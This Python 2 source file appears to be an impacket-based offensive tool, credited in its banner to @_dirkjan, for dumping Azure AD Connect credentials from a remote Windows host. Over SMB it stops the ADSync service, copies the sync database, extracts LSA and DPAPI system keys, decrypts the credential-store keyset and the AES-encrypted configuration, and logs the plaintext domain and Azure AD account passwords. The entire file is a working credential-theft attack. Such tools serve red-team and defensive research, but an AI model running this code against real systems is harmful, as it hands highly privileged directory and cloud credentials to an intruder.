import argparse
import codecs
import logging
import os
import time
import sys
import ntpath
from binascii import unhexlify
from impacket import version
from impacket.uuid import string_to_bin, bin_to_string
from impacket.examples import logger
from impacket import smb3structs
from impacket.smbconnection import SMBConnection, SessionError
from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi
from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, OfflineRegistry, RemoteFile
from impacket.dpapi import MasterKeyFile, MasterKey, DPAPI_BLOB, CredentialFile, CREDENTIAL_BLOB
from impacket.winregistry import hexdump
from Cryptodome.Hash import HMAC, SHA1, MD4
from hashlib import pbkdf2_hmac
import subprocess
import xml.etree.ElementTree as ET
import base64
import hashlib
import binascii
import codecs
import sys
from Cryptodome import Random
from Cryptodome.Cipher import AES

def unpad(s):
    return s[:-ord(s[len(s)-1:])]

def deriveKeysFromUserkey(sid, pwdhash):
    if len(pwdhash) == 20:
        # SHA1
        key1 = HMAC.new(pwdhash, (sid + '\0').encode('utf-16le'), SHA1).digest()
        key2 = None
    else:
        # Assume MD4
        key1 = HMAC.new(pwdhash, (sid + '\0').encode('utf-16le'), SHA1).digest()
        # For Protected users
        tmpKey = pbkdf2_hmac('sha256', pwdhash, sid.encode('utf-16le'), 10000)
        tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
        key2 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]

    return key1, key2

class RemoteFileRO(RemoteFile):
    '''
    RemoteFile class that doesn't remove the file on close
    '''
    def __init__(self, smbConnection, fileName, tree='ADMIN$'):
        RemoteFile.__init__(self, smbConnection, fileName)
        self._RemoteFile__tid = smbConnection.connectTree(tree)

    def close(self):
        if self._RemoteFile__fid is not None:
            self._RemoteFile__smbConnection.closeFile(self._RemoteFile__tid, self._RemoteFile__fid)
            self._RemoteFile__fid = None

class ADSRemoteOperations(RemoteOperations):
    def __init__(self, smbConnection, doKerberos, kdcHost=None, options=None):
        RemoteOperations.__init__(self, smbConnection, doKerberos, kdcHost)
        self.__smbConnection = smbConnection
        self.__serviceName = 'ADSync'
        self.__shouldStart = False
        self.__options = options

    def gatherAdSyncMdb(self):
        # Assume DB was already downloaded
        if self.__options.existing_db:
            return
        self.__connectSvcCtl()
        try:
            self.__checkServiceStatus()
            logging.info('Downloading ADSync database files')
            with open('ADSync.mdf','wb') as fh:
                self.__smbConnection.getFile('C$',r'Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf', fh.write)
            with open('ADSync_log.LDF','wb') as fh:
                self.__smbConnection.getFile('C$',r'Program Files\Microsoft Azure AD Sync\Data\ADSync_log.ldf', fh.write)
        finally:
            self.__restore_adsync()

    def gatherCredentialFiles(self, basepath):
        items = self.__smbConnection.listPath('C$', r'{0}\AppData\Local\Microsoft\Credentials\\*'.format(basepath))
        outvaults = []
        for item in items:
            if item.get_longname() == '.' or item.get_longname() == '..':
                continue
            outvaults.append(item.get_longname())
        return outvaults

    def findBasePath(self):
        basepaths = [
            r'Users\ADSync',
            r'Windows\ServiceProfiles\ADSync',
        ]
        outbasepath = None
        for basepath in basepaths:
            try:
                # Query folder
                items = self.__smbConnection.listPath('C$', r'{0}\AppData\*'.format(basepath))
                # If folder exists, break
                outbasepath = basepath
                break
            except SessionError as err:
                if 'STATUS_OBJECT_PATH_NOT_FOUND' in str(err):
                    items = None
                    # Try a different basepath
                    continue
        if items is None:
            logging.error('Could not find the ADSync profile directory')
            return

        return outbasepath

    def processCredentialFile(self, file, userkey, basepath):
        tsid = None

        logging.info('Querying credential file %s', file)
        remoteFileName = RemoteFileRO(self.__smbConnection, r'{1}\AppData\Local\Microsoft\Credentials\{0}'.format(file, basepath), tree="C$")
        try:
            remoteFileName.open()
            data = remoteFileName.read(8000)
            cred = CredentialFile(data)
            # if logging.getLogger().level == logging.DEBUG:
                # cred.dump()
            blob = DPAPI_BLOB(cred['Data'])
        finally:
            remoteFileName.close()
        gmk = bin_to_string(blob['GuidMasterKey'])

        items = self.__smbConnection.listPath('C$', r'%s\AppData\Roaming\Microsoft\Protect\*' % basepath)

        for item in items:
            if item.get_longname().startswith('S-1-5-80'):
                tsid = item.get_longname()
                logging.info(r'Found SID %s for NT SERVICE\ADSync Virtual Account', tsid)

        if tsid is None:
            logging.error('Could not determine SID for ADSync user - cannot continue searching for masterkeys')
            return

        key1, key2 = deriveKeysFromUserkey(tsid, userkey)
        remoteFileName = RemoteFileRO(self.__smbConnection, r'{2}\AppData\Roaming\Microsoft\Protect\{0}\{1}'.format(tsid, gmk, basepath), tree="C$")
        try:
            remoteFileName.open()
            data = remoteFileName.read(8000)
            mkf = MasterKeyFile(data)
            if logging.getLogger().level == logging.DEBUG:
                mkf.dump()
            data = data[len(mkf):]
            # Extract master key
            if mkf['MasterKeyLen'] > 0:
                mk = MasterKey(data[:mkf['MasterKeyLen']])
                data = data[len(mk):]
            decryptedKey = mk.decrypt(key1)
            if not decryptedKey:
                decryptedKey = mk.decrypt(key2)
            if not decryptedKey:
                logging.error('Encryption of masterkey failed using SYSTEM UserKey + SID')
                return
            logging.info('Decrypted ADSync user masterkey using SYSTEM UserKey + SID')
            data = CREDENTIAL_BLOB(blob.decrypt(decryptedKey))
            # if logging.getLogger().level == logging.DEBUG:
            #     data.dump()
            # print(data['Target'])
            if 'Microsoft_AzureADConnect_KeySet' in data['Target'].decode('utf-16le'):
                parts = data['Target'].decode('utf-16le')[:-1].split('_')
                return {
                    'instanceid': parts[3][1:-1].lower(),
                    'keyset_id': parts[4],
                    'data': data['Unknown3']
                }
            else:
                logging.info('Found credential containing %s, attempting next', data['Target'])
                return
        except SessionError as e:
            if 'STATUS_OBJECT_PATH_NOT_FOUND' in str(e):
                logging.error('Could not find masterkey for file with GUID %s', gmk)
            else:
                raise
        finally:
            remoteFileName.close()

    def decryptDpapiBlobSystemkey(self, item, key, entropy):
        cryptkey = None
        kb = DPAPI_BLOB(item)
        mk = bin_to_string(kb['GuidMasterKey'])
        logging.info('Decrypting DPAPI data with masterkey %s', mk)
        # We use the RO class here since the regular class removes the file on exit
        # Deleting DPAPI keys doesn't seem like the best idea, so best not to do this
        remoteFileName = RemoteFileRO(self.__smbConnection, 'SYSTEM32\\Microsoft\\Protect\\S-1-5-18\\%s' % mk)
        try:
            remoteFileName.open()
            data = remoteFileName.read(2000)
            mkf = MasterKeyFile(data)
            if logging.getLogger().level == logging.DEBUG:
                mkf.dump()
            data = data[len(mkf):]
            # Extract master key
            if mkf['MasterKeyLen'] > 0:
                mk = MasterKey(data[:mkf['MasterKeyLen']])
                data = data[len(mk):]
            decryptedKey = mk.decrypt(key)
            try:
                decryptedkey = kb.decrypt(decryptedKey, entropy=entropy)
                cryptkey = decryptedkey
                if logging.getLogger().level == logging.DEBUG:
                    hexdump(decryptedkey)
            except Exception as ex:
                logging.error('Could not decrypt keyset %s: %s', item, str(ex))
        finally:
            remoteFileName.close()
        return cryptkey

    def getMdbData(self, codec='utf-8'):

        out = {
            'cryptedrecords': [],
            'xmldata': []
        }
        keydata = None
        #
        if self.__options.from_file:
            logging.info('Loading configuration data from %s on filesystem', self.__options.from_file)
            infile = codecs.open(self.__options.from_file, 'r', codec)
            enumtarget = infile
        else:
            logging.info('Querying database for configuration data')
            dbpath = os.path.join(os.getcwd(), r"ADSync.mdf")
            output = subprocess.Popen(["ADSyncQuery.exe", dbpath], stdout=subprocess.PIPE).communicate()[0]
            enumtarget = output.split('\n')
        for line in enumtarget:
            try:
                ltype, data = line.strip().split(': ')
            except ValueError:
                continue
            ltype = ltype.replace(u'\ufeff',u'')
            if ltype.lower() == 'record':
                xmldata, crypteddata = data.split(';')
                out['cryptedrecords'].append(crypteddata)
                out['xmldata'].append(xmldata)

            if ltype.lower() == 'config':
                instance, keyset_id, entropy = data.split(';')
                out['instance'] = instance
                out['keyset_id'] = keyset_id
                out['entropy'] = entropy
        if self.__options.from_file:
            infile.close()
        # Check if all values are in the outdata
        required = ['cryptedrecords', 'xmldata', 'instance', 'keyset_id', 'entropy']
        for option in required:
            if not option in out:
                logging.error('Missing data from database. Option %s could not be extracted. Check your database or output file.', option)
                return None
        return out


    def saveADSYNC(self):
        logging.debug('Saving AD Sync data')
        return self._RemoteOperations__retrieveHive('SOFTWARE\\Microsoft\\Ad Sync')

    def __restore_adsync(self):
        # First of all stop the service if it was originally stopped
        if self.__shouldStart is True:
            logging.info('Starting service %s' % self.__serviceName)
            scmr.hRStartServiceW(self.__scmr, self.__serviceHandle)

    def __connectSvcCtl(self):
        rpc = transport.DCERPCTransportFactory(self._RemoteOperations__stringBindingSvcCtl)
        rpc.set_smb_connection(self.__smbConnection)
        self.__scmr = rpc.get_dce_rpc()
        self.__scmr.connect()
        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)

    def __checkServiceStatus(self):
        # Open SC Manager
        ans = scmr.hROpenSCManagerW(self.__scmr)
        self.__scManagerHandle = ans['lpScHandle']
        # Now let's open the service
        ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__serviceName)
        self.__serviceHandle = ans['lpServiceHandle']
        # Let's check its status
        ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
        if ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
            logging.info('Service %s is in stopped state'% self.__serviceName)
            self.__shouldStart = False
            self.__stopped = True
        elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
            logging.debug('Service %s is running'% self.__serviceName)
            self.__shouldStart = True
            self.__stopped  = False
        else:
            raise Exception('Unknown service state 0x%x - Aborting' % ans['lpServiceStatus']['dwCurrentState'])
        # If service is running, stop it temporarily
        if self.__stopped is False:
            logging.info('Stopping service %s' % self.__serviceName)
            scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
            i = 0
            time.sleep(3)
            # Wait till it is stopped
            while i < 20:
                ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
                if ans['lpServiceStatus']['dwCurrentState'] != scmr.SERVICE_STOPPED:
                    i+=1
                    time.sleep(1)
                else:
                    return
            raise Exception('Failed to stop service within 20 seconds - Aborting')



class ADSync(OfflineRegistry):
    def __init__(self, samFile, isRemote = False, perSecretCallback = lambda secret: _print_helper(secret)):
        OfflineRegistry.__init__(self, samFile, isRemote)
        self.__samFile = samFile
        self.__hashedBootKey = ''
        self.__itemsFound = {}
        self.__itemsWithKey = {}
        self.__perSecretCallback = perSecretCallback

    def dump(self):
        logging.info('In dump')
        for key in self.enumKey('Shared'):
            logging.info('Found keyset ID %s', key)
            value = self.getValue(ntpath.join('Shared',key,'default'))
            if value is not None:
                self.__itemsFound[key] = value[1]

    def process(self, remoteops, key, entropy):
        cryptkeys = []
        for index, item in self.__itemsFound.items():
            remoteops.decryptDpapiBlobSystemkey(item, key, entropy)
        return cryptkeys

class DumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='', options=None):
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__adSyncHive = None
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = options.outputfile
        self.__doKerberos = options.k
        self.__canProcessSAMLSA = True
        self.__kdcHost = options.dc_ip
        self.__options = options
        self.dpapiSystem = None

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):
        # Debugging only
        # self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost, preferredDialect=smb3structs.SMB2_DIALECT_21)
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)

        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    @staticmethod
    def decrypt(record, keyblob):
        # print repr(keyblob)
        # print binascii.hexlify(keyblob[-44:])
        key1 = keyblob[-44:]
        # print binascii.hexlify(keyblob[-88:-44])
        key2 = keyblob[-88:-44]

        dcrypt = base64.b64decode(record)
        # hexdump(dcrypt)
        iv = dcrypt[8:24]
        # hexdump(iv)
        cryptdata = dcrypt[24:]

        cipher = AES.new(key2[12:], AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(cryptdata)).decode('utf-16-le')

    # From examples/dpapi.py
    def getDPAPI_SYSTEM(self,secretType, secret):
        if secret.startswith("dpapi_machinekey:"):
            machineKey, userKey = secret.split('\n')
            machineKey = machineKey.split(':')[1]
            userKey = userKey.split(':')[1]
            self.dpapiSystem = {}
            self.dpapiSystem['MachineKey'] = unhexlify(machineKey[2:])
            self.dpapiSystem['UserKey'] = unhexlify(userKey[2:])
            logging.info('Found DPAPI machine key: %s', machineKey)

    def fetchMdb(self):
        self.__remoteOps.gatherAdSyncMdb()

    def getMdbData(self):
        try:
            return self.__remoteOps.getMdbData()
        except UnicodeDecodeError:
            return self.__remoteOps.getMdbData('utf-16-le')

    def dump(self):
        try:
            self.__isRemote = True
            bootKey = None
            try:
                try:
                    self.connect()
                except Exception, e:
                    if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                        # SMBConnection failed. That might be because there was no way to log into the
                        # target system. We just have a last resort. Hope we have tickets cached and that they
                        # will work
                        logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                        pass
                    else:
                        raise

                self.__remoteOps  = ADSRemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost, self.__options)
                self.fetchMdb()
                mdbdata = self.getMdbData()
                if mdbdata is None:
                    logging.error('Could not extract required database information. Exiting')
                    return
                logging.info('Querying LSA secrets from remote registry')
                self.__remoteOps.enableRegistry()
                bootKey = self.__remoteOps.getBootKey()
            except Exception, e:
                self.__canProcessSAMLSA = False
                if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                    and self.__doKerberos is True:
                    # Giving some hints here when SPN target name validation is set to something different to Off
                    # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                    logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
                else:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logging.error('RemoteOperations failed: %s', str(e))
                    return

            try:
                SECURITYFileName = self.__remoteOps.saveSECURITY()


                self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                               isRemote=self.__isRemote, history=False, perSecretCallback = self.getDPAPI_SYSTEM)
                self.__LSASecrets.dumpSecrets()
            except Exception, e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                logging.error('LSA hashes extraction failed: %s', str(e))

            if not self.dpapiSystem:
                logging.error('DPAPI secrets not found in LSA dump')
                return

            # New format? Use it unless told not to
            if not self.__options.legacy:
                # New format stores in in the credential store
                logging.info('New format keyset detected, extracting secrets from credential store')
                basepath = self.__remoteOps.findBasePath()
                files = self.__remoteOps.gatherCredentialFiles(basepath)
                for credfile in files:
                    result = self.__remoteOps.processCredentialFile(credfile, self.dpapiSystem['UserKey'], basepath)
                    if result is not None:
                        if result['keyset_id'] != mdbdata['keyset_id'] or result['instanceid'] != mdbdata['instance']:
                            logging.warning('Found keyset %s instance %s, but need keyset %s instance %s. Trying next',
                                result['keyset_id'], result['instanceid'], mdbdata['keyset_id'], mdbdata['instance'])
                        else:
                            logging.info('Found correct encrypted keyset to decrypt data')
                            break
                if result is None:
                    logging.error('Failed to find correct keyset data')
                    return
                cryptkeys = [self.__remoteOps.decryptDpapiBlobSystemkey(result['data'], self.dpapiSystem['MachineKey'], string_to_bin(mdbdata['entropy']))]
            else:
                # Old format: registry stored
                try:
                    ADSYNCFileName = self.__remoteOps.saveADSYNC()
                    logging.info('Extracting AD Sync encryption keys from registry')
                    self.__AdSync = ADSync(ADSYNCFileName, isRemote=self.__isRemote)
                    self.__AdSync.dump()
                except Exception, e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logging.error('Ad Sync extraction failed: %s', str(e))

                try:
                    cryptkeys = self.__AdSync.process(self.__remoteOps, self.dpapiSystem['MachineKey'], string_to_bin(mdbdata['entropy']))
                except Exception, e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logging.error('DPAPI master key extraction failed: %s', str(e))

            try:
                logging.info('Decrypting encrypted AD Sync configuration data')
                for index, record in enumerate(mdbdata['cryptedrecords']):
                    # Try decrypting with highest cryptkey record
                    drecord = DumpSecrets.decrypt(record, cryptkeys[-1]).replace('\x00','')

                    with open('r%d_xml_data.xml' % index, 'w') as outfile:
                        data = base64.b64decode(mdbdata['xmldata'][index]).decode('utf-16-le')
                        outfile.write(data)
                    with open('r%d_encrypted_data.xml' % index, 'w') as outfile:
                        outfile.write(drecord)
                    ctree = ET.fromstring(drecord)
                    dtree = ET.fromstring(data)
                    if 'forest-login-user' in data:
                        logging.info('Local AD credentials')
                        el = dtree.find(".//parameter[@name='forest-login-domain']")
                        if el is not None:
                            logging.info('\tDomain: %s', el.text)
                        el = dtree.find(".//parameter[@name='forest-login-user']")
                        if el is not None:
                            logging.info('\tUsername: %s', el.text)
                    else:
                        # Assume AAD config
                        logging.info('Azure AD credentials')
                        el = dtree.find(".//parameter[@name='UserName']")
                        if el is not None:
                            logging.info('\tUsername: %s', el.text)
                    # Can be either lower or with capital P
                    fpw = None
                    el = ctree.find(".//attribute[@name='Password']")
                    if el is not None:
                        fpw = el.text
                    el = ctree.find(".//attribute[@name='password']")
                    if el is not None:
                        fpw = el.text
                    if fpw:
                        # fpw = fpw[:len(fpw)/2] + '...[REDACTED]'
                        logging.info('\tPassword: %s', fpw)


            except Exception, e:
                #if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
                logging.error('Recprd decryption failed: %s', str(e))


        except (Exception, KeyboardInterrupt), e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
        finally:
            try:
                self.cleanup()
            except:
                pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__AdSync:
            self.__AdSync.finish()



# Process command-line arguments.
if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    print 'Azure AD Connect remote credential dumper - by @_dirkjan'

    parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from "
                                                      "the remote machine without executing any agent there.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                       ' (if you want to parse local files)')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('--legacy', action='store_true', help='Use legacy keyset storage location (registry)')
    parser.add_argument('--existing-db', action='store_true', help='Do not download the MDB but assume it is already in the current directory')
    parser.add_argument('--from-file', action='store', metavar="FILE",
                        help='Read the output of ADSyncQuery from a file you created previously instead of doing it live')
    parser.add_argument('-outputfile', action='store',
                        help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                             ' the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                            ' (128 or 256 bits)')
    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                 'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re

    domain, username, password, remoteName = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')

    #In case the password contains '@'
    if '@' in remoteName:
        password = password + '@' + remoteName.rpartition('@')[0]
        remoteName = remoteName.rpartition('@')[2]

    if options.target_ip is None:
        options.target_ip = remoteName

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    dumper = DumpSecrets(remoteName, username, password, domain, options)
    try:
        dumper.dump()
    except Exception, e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)
